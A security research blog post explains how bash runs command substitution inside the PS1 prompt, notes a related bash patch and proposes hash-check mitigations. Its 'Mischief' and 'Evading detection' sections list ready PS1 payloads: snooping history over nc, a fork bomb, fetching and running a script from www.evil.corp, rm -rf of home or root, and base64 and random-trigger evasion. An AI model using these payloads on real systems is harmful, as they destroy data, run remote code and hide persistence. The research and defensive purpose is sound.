---
title: Stupid bash tricks- command substitution, command injection, and the bash command prompt
slug: bash-command-injection
date_published: 2025-01-21 T04:18:00.000Z
date_updated: 
tags: research, linux, bash, command injection, parsing
excerpt: Learn about command substitution in the bash command prompt
cover:
author:
  name: MalcolmS
  avatar:
---

It turns out you can use special characters in linux user names.  Cute, but it can have some unexpected consequences.  Be glad your user name isn’t `$(rm -rf ~)` for instance.  Can you guess what happens when you open up your first interactive bash shell?

# Command Substitution
Yup, command substitution happens.  Bye bye, files.  Bash, like all good shells, will take the output of a command contained within $() or `` (backticks) and substitute the command’s output into the string where the command was.  Pretty handy for all kinds of shell tasks, and it even works in the prompt definition string.  Even if your user name happens to be an injected command!

Bash uses the environment variable, PS1 to define the prompt string.  Escaped characters like \u and \w, for instance, get expanded into other strings that are useful for dynamic prompt components, like the user name or working directory.  But even more flexibility comes from substituting the output of an arbitrary command.  In the above example, the \u in the prompt string gets substituted by `$(rm -rf ~)`, which then gets substituted by the output of running that command.  Even if the command yields no output, it has still been run.

(Note, bash also recognizes PS2, PS3, and PS4, which will not be discussed further in this writeup.)

# Parsing
Shells have to do a lot of parsing, and do it correctly, every time.  Writing good parsers is actually really hard, in part because it’s so easy to write vulnerable code.  It’s been suggested that writing parsers should be done as rigorously as writing cryptographic libraries<sup>1</sup>)-- in other words, don’t “roll your own.”

If you need a parser that doesn’t already exist, and don’t want to write it from scratch yourself, you’re in luck.  General purpose parser generators, like GNU Bison<sup>2</sup> and Yacc (Yet Another Compiler Compiler)<sup>3</sup> and various others take a user-defined, context free grammar and use it to output code (C, in this case) that performs the corresponding parsing for you.

The bash code base employs Bison to generate a core function called yyparse from the grammar defined in parse.y.  This file, parse.y, also contains C code snippets which Bison copies directly, along with the generated yyparse, into a source file called y.tab.c.

When parsing PS1, Bash expands \ characters (like \u and \w) before it performs command substitution.  This is why `\u` -> `$(rm -rf ~)` -> `<command execution>`.  But suppose that your working path contains a directory named `$(ls)`?  Will `ls` be run?  In this case, actually, no.  The reason is that the bash source code (in `parse.y`, function `decode_prompt_string`) puts the directory string into double quotes, masking it from future expansion.

For the latest master branch at the time of this writeup (bash 5.2), bash doesn’t double-quote user names after expansion from \u, though.  The good news: a patch based on this work was accepted<sup>4</sup> on 20 Jan 2025, for a future release, that double-quotes the expanded string of \u.  This exempts that string from being parsed for command substitution.

When bash finds a command substitution that it needs to parse in PS1, it begins a series of nested calls starting with `decode_prompt_string` in `parse.y`, and going back and forth between routines in `parse.y`, `subst.c`, and `builtins/evalstring.c`, early on joining the common pathway of command substitution, and ultimately calling `execute_command_internal` in `execute_cmd.c`.  The subshell created to do this captures the output of the command and returns it to `decode_prompt_string`, and that goes into your prompt string.<sup>5</sup>

Note: This article specifically focuses on how bash does this, but some other shells will do it, too.  Ash will execute commands, as will zsh if you first enable the PROMPT_SUBST (promptsubst) option<sup>6</sup>, but many others will not.

It’s worth mentioning that commands executed via substitution don’t make it, by themselves, into the `.bash_history` file.  And why should they?  These substitutions are helpers that are often part of scripts or other automated tasks.  The history file would fill up quickly with chaff unless it ignored all of these commands.  Generally speaking, only commands typed into the CLI make it into history.  For more information, see the history man page, or a nice writeup by MattCASmith<sup>6</sup>.

# The Command Prompt
Command substitution is, of course, an indispensable part of shells.  And it’s a convenient way to inject useful dynamic text into your prompt string.  But if you simply want to execute a command before every prompt, command substitution in the prompt string is not your “go-to” way to do this.

For that purpose, bash offers the user an environment variable called `PROMPT_COMMAND`, and it runs this command before it gets into the business of generating each command prompt.  `PROMPT_COMMAND` can also work in concert with `PS1`, depending on how you wanted to do things.  But almost anything you can do with `PROMPT_COMMAND` can also be crammed into `PS1`, with at least one major exception.  `PROMPT_COMMAND` commands are executed in the current shell, but `PS1` substituted commands are performed in a subshell.  The impact of this is that environment changes in the subshell die with the subshell and do not back-propagate to the parent shell.  So, output redirection and environment variable changes are durable if done by `PROMPT_COMMAND`, but ephemeral if done by `PS1`.  Another difference: `PS1` will expand special escape characters, such as ‘\u’ for user names, as mentioned above, but `PROMPT_COMMAND` will not.

Different linux distributions and shells tend to offer their own default versions of what they consider to be a useful and aesthetic prompt.  But many users customize `PS1` to suit their own needs.  One category of uses is for presenting timely information.  For instance, you might have it display your IP address, or change colors depending on the most recent exit status, or show which git branch is checked out in your working directory.

Another category of uses involves automating frequent tasks or checks.  For instance, commands run by `PS1` or `PROMPT_COMMAND` might run `history -a` to ensure every regular command that has been executed is written immediately to `.bash_history` instead of waiting until the terminal session closes--which helps prevent loss of history if the shell is SIGKILLed or power is suddenly lost.

This capacity can, of course, be used for mischief in the wrong hands.  It may seem like an inefficient method for an attacker, because if they can change an environment variable for your prompt, they can probably execute other code, so why would they bother with this?

One scenario is when the actor has a brief time window of opportunity to enter commands on your keyboard.  By quickly editing `.bashrc`, they may gain persistence.  Another scenario might be if they can trick a victim into running a malicious shell script and they want a reliable, one-liner payload.  Another scenario might involve an attacker who already owns the victim’s account, but needs to avoid certain canaries (i.e. alerts of compromise) or countermeasures.

# Mitigation, Part 1
Beyond universal security principles, specific mitigations for this category of attack could include periodic or automatic verification of the contents of `.bashrc`, `/etc/environment`, any routine scripts, and specific environment variables.  It’s worth being aware that modules like PAM can also set environment variables, although an exploit at this level would entail more dire concerns.

`PS1` and `PROMPT_COMMAND` can both contain commands to validate themselves and/or the other variable, and alert the user if an unexpected state is detected.  `PROMPT_COMMAND` could reset `PS1` to a trusted value.  Either could do a checksum on the variable, or use a low-cost hash function, and compare against a trusted value (such as a value or hash stored in a write-protected file).  This would be an imperfect, but relatively inexpensive, method for situations where you could screen for changes in `PS1`.

Example, in .bashrc:

    PROMPT_COMMAND=’echo $PS1 | md5sum -z | diff ~/.myPS1hash - > /dev/null;\
    if [[ $? -gt 0 ]]; then\
        echo Warning, PS1 altered;\
    else\ echo PS1 OK;\
    Fi; # ugly
    
    Or in PS1:
    PS1='$( \
        echo $PS1 | md5sum -z | diff -q - ~/.myPS1hash >/dev/null; 
        if [[ $? -eq 0 ]]; then \
            echo -e "\033[1;32m\u@\h:\w\\$ \033[0m"; \ # Green text means OK
        else \
            echo -e "\033[1;31m\u@\h:\w\\$ \033[0m"; \ # Red text is bad
        fi )' # less ugly

Once you set your new `PS1`, just `echo $PS1 | md5sum -z > ~/.myPS1hash` and make sure it is write protected, or maybe even give ownership to root.

# Mitigation, Part 2
Since this is, essentially, a screening methodology, it is worth interjecting a few words on proper screening test design.

An ideal screening test is fast, cheap and highly sensitive, at the expense of specificity.  In other words, you accept the burden of many false positive results, for the benefit of being less likely to miss a true positive event.  Given that a test which is fast and cheap is rarely going to be accurate, the test is intentionally tuned to favor flagging something as abnormal if there’s any uncertainty.  The mitigation strategy described so far, of checking for changes in variables, is highly specific, i.e. it’s not likely to falsely report a change in a string.  But, it’s not very sensitive, i.e. there are many ways an effective attacker could defeat it.  In other words, it’s the opposite of what a good screening test should be, in at least one regard.

Unfortunately, in cybersecurity, sensitivity is an ever-elusive goal.  With intelligent adversaries trying to be as undetectable as possible, creating a high sensitivity screening test for this situation can be very difficult.  Easy screening methods for this attack all basically depend on the attacker not being aware of, nor bothering to try, circumvention.

Not only are simple detection methods easy to circumvent, but robust detection methods are hard to create.  Indeed, one of the specific challenges faced is that it is tough to actively monitor these variables from outside the shell itself.  `/proc/<pid>/environ` can helpfully show the shell’s initial environment, but it never updates, and is therefore insufficient.  Following an environment variable directly from outside the shell would probably require something on the level of a ptrace system call.  Now we’re getting into some pretty invasive monitoring, which is not easy to set up and may entail significant performance costs.  One could indirectly follow environment variables by periodically exporting the environment to a file, and ensuring a daemon monitors that file.  But even that method suffers from various weaknesses, especially if it depends on `PROMPT_COMMAND` or `PS1` themselves to do the exporting.

# Mischief
The point is not to present malicious code here, but to provide proof of concept for non-trivial attacks, such as denial of service, data destruction, or exfiltration.  And while pretty much all of these could be adapted into `PROMPT_COMMAND`, they are simply shown here in `PS1=` form to highlight command substitution.

One thing an attacker wouldn’t want to do, would be to make an obvious change to the appearance of the command prompt itself.  The following examples assume a simplistic command prompt appearance, but a better concept might involve `PROMPT_COMMAND` capturing the original `PS1` into a backup variable, so then `PS1` can invoke that backup variable to recreate the original appearance.

### Examples (i.e. PS1=' ', using single quotes)

Nuisances: Injecting delays, screen clearing pranks

    '$(sleep 2)\u@\h:\w$ '
    '$(clear)\u@\h:\w$ '

Snooping on command history:

    '$(history -a; tail -n 1 ~/.bash_history | nc -q 0 localhost 12345)\u@\h:\w$ '
    # set up a listener on localhost 12345 to snoop on what the user is running

There are limits to how real-time you can snoop.  You might expect this would allow for complete output snooping:

    '$([[ -t 1 ]] && exec > >(tee >(nc -q 0 localhost 12345)) 2>&1)\u@\h:\w$ '

But, this does not work.  The command is run in a sub-shell, so any output redirection method that is born there, dies there.  This aspect makes it hard, if not impossible, to use output redirection as intended. (Prove me wrong, though!)

Fork bombing (see evading, below):

    '`bomb() { bomb | bomb& }; bomb`\u@\h:\w$ '
    # can obfuscate trivially by replacing 'bomb' with a single character

RCE / fetching commands from a C2 server:

    '$(wget -q -O - www.evil.corp/c2/script_to_run.sh | sh)\u@\h:\w$ '

Gradually filling up the file system:

    '`echo \`cat ~/.profile\` >> ~/.profile`\u@\h:\w$ '

Deleting a user's home folder:

    '$(rm -rf ~)\u@\h:\w$ '

    '$(rm -rf /* > /dev/null 2>&1)\u@\h:\w$ '

The latter will not delete everything, but it will delete everything the user is privileged for, including their home folder. As a bonus, it will also tie things up for a while as it branches through the entire filesystem.

Deleting all files (after tricking them into entering the sudo pw)

    '$(sudo rm -rf /*)\u$\h:\w$ '

Some potential attacks are limited by the command substitution occurring in a subshell.  Future work might include how to potentially use a tool like script to log all shell text, or how to build an actual keylogger, which would be more complicated.  Another complicated exploit might involve engineering the user into entering their current password, which could be exfiltrated or used to change the password itself.

# Evading detection:
One thing an attacker might want to do, is to revert `PS1` to the pre-attack value.  If you recall above, `PS1` cannot do this to itself!  The reason why?  Remember, `PS1` command substitution is run in a subshell (unlike with regard to `PROMPT_COMMAND`).  This subshell inherits the environment of the parent shell, but changes made to the environment therein do not propagate back.  So, `PS1` cannot effect any real changes in any environment variables.  Only a `PROMPT_COMMAND` instruction can do this.

Some actions, like erasing a user’s home folder, or fork bombing, are so drastic that they likely result in immediate discovery of the attack.  An attacker can be sneakier by combining some of the more impactful attacks with a probabilistic check.  If a fork bomb only executes 1 in 100 times, for instance, it is much more likely to misdirect blame toward something else:

    `if [ $(($RANDOM % 100)) -eq 1 ]; then do_something_nasty; fi`

These commands kind of stick out in PS1.  Maybe we can obfuscate them a little bit.  What about base64 encoding your command?

    '$(echo c2xlZXAgMg== | base64 -d)'

You could also add to `PROMPT_COMMAND` to auto-revert `PS1`, to hide your tracks.  Lots of ways to do this, especially if `check_for_something` below is a silent shell function that you control.

    `if [ "$(check_for_something)" -eq 1 ]; then PS1=$OLDPS1 "; fi`
    ‘[ “$(check_something 2> /dev/null)” ] && PS1=$OLDPS’ # more concise, but potentially less robust than an if statement


Recent versions of bash (since 5.1-alpha) allow `PROMPT_COMMAND` to be an array of commands.  This could facilitate removing incriminating commands without having to selectively regenerate an entire, long string.

Speaking of covering your tracks, remember how prompt command substitution does not show up in bash history? There are, of course, many ways to avoid recording commands in the bash history, but one of them might be executing them by prompt command substitution. Forensic investigators should already understand that bash history is relatively specific, but not sensitive, diagnostically speaking.  In other words: if something is in the history, it probably happened...  but if it’s not there, it doesn’t mean it didn’t happen.

A final word on user names: this whole journey began with the observation (By Ben Kallus and Jonah Weinberg of ISTS/Dartmouth College) that linux behaves strangely when a user has a malicious name, like `$(rm -rf ~)`.  But the user name could be malicious without invoking command substitution.  For instance, the user name "`../tmp`", yields an unexpected account with a valid, but non-obvious, home folder, which could serve as a back door.

There have even been recent debates<sup>8</sup> about what kinds of special characters, non-ASCII character sets, or other patterns warrant closer scrutiny in Debian user names.  While it is understandable and perhaps even supportable that many users want characters beyond ASCII, great care should be taken to avoid introducing new security risks.  The case of confusing identical- or similar-appearing unicode characters is a prime example.  One must expect that any broad increase in complexity will inevitably carry with it new security risks, and prepare accordingly.

Prompt command substitution is powerful, flexible, and completely agnostic towards your security concerns.  Many of the above examples can be combined for greater effect.  Have fun experimenting with them, and try not to erase your home folder while you're at it!

# Acknowledgements
Thanks to Ben Kallus and Jonah Weinberg for ideas and discussions.  Additional thanks to

# References

1. Bratus, et al. Curing the Vulnerable Parser: Design Patterns for Secure Input Handling.  Usenix ;login:, Spring 2017 Vol. 42, NO. 1, 32-39

2. https://www.gnu.org/software/bison/

3. https://www.cs.utexas.edu/~novak/yaccpaper.htm

4. https://savannah.gnu.org/patch/?10496

5. https://git.savannah.gnu.org/cgit/bash.git maintained by Chet Ramey

6. https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html

7. https://mattcasmith.net/2022/02/22/bash-history-basics-behaviours-forensics

8. https://lwn.net/ml/all/Zz9xogrnHDSFjZUn@torres.zugschlus.de/


